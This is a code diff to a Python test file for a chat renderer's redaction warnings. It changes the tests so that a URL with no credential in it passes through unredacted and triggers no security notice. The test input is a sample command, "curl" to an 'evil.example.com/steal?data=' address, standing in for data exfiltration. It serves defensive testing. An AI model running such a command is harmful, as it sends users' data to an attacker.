@@ -465,31 +465,16 @@ class TestRedactionWarning:
     _EXFIL_URL = "https://evil.example.com/steal?data=" + "A" * 250
 
     @pytest.mark.asyncio
-    async def test_redacted_url_appends_a_warning_with_the_url_remedy(self) -> None:
-        """A URL rewrite must not be silent either.
-
-        ``_default_redactor`` runs ``redact_exfiltration_urls`` over every chunk
-        on the way out, so the delivered answer can carry a URL placeholder with
-        no credential at all. The follow-up must say it was a URL and name the URL
-        remedy (re-check the link), not the credential one (re-enter a secret).
-        """
+    async def test_a_url_with_no_credential_sends_no_warning(self) -> None:
+        """A URL is never replaced whole: with no credential in it, it is sent as
+        written, nothing was rewritten, and no follow-up is sent."""
         client = FakeClient()
         renderer = _renderer(client)
         await renderer.on_text_chunk(f"run: curl '{self._EXFIL_URL}'")
         await renderer.on_done()
 
-        assert len(client.sent) >= 2
-        answer = "".join(client.sent[:-1])
-        warning = client.sent[-1]
-        # Redaction not relaxed: the URL is gone from the wire, the tag is there.
-        assert "evil.example.com/steal" not in answer
-        assert "[REDACTED: suspicious URL to " in answer
-        assert "Security notice" in warning
-        assert "suspicious URL" in warning
-        assert "re-check" in warning
-        assert "credential" not in warning
-        assert "supply the secret" not in warning
-        assert "evil.example.com" not in warning
+        assert "evil.example.com/steal" in "".join(client.sent)
+        assert not any("Security notice" in m for m in client.sent)
 
     @pytest.mark.asyncio
     async def test_credential_only_wording_is_unchanged_by_the_url_tally(self) -> None:
@@ -504,15 +489,13 @@ class TestRedactionWarning:
         assert client.sent[-1] == credential_redaction_notice(1)
 
     @pytest.mark.asyncio
-    async def test_credential_and_url_send_exactly_one_warning_naming_both(self) -> None:
+    async def test_credential_and_url_send_exactly_one_credential_warning(self) -> None:
         client = FakeClient()
         renderer = _renderer(client)
         await renderer.on_text_chunk(f"psql {self._SECRET_URI}; curl '{self._EXFIL_URL}'")
         await renderer.on_done()
 
+        from kiro_crew.messaging.renderer import credential_redaction_notice
+
         warnings = [m for m in client.sent if "Security notice" in m]
-        assert len(warnings) == 1
-        assert "credential" in warnings[0]
-        assert "suspicious URL" in warnings[0]
-        assert "supply the secret" in warnings[0]
-        assert "re-check" in warnings[0]
+        assert warnings == [credential_redaction_notice(1)]
